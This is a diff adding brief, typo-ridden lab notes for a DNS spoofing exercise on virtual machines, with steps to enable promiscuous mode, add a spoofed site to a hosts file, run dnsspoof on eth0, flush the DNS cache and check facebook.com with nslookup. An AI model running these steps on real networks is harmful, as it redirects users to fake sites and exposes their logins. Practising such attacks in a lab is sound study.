@@ -1,0 +1,24 @@
+enable promiscous on vms
+
+enable dhcp
+enter dhcp entries
+
+
+
+vim /tmp/hosts entry to add website to spoof
+
+
+
+dnsspoof -i eth0 -f /tmp/  //to specify domians file
+
+
+
+ipconfgi /dnsflush  //to clear dnscache
+
+
+
+nslookup facebook.com
+
+
+
+
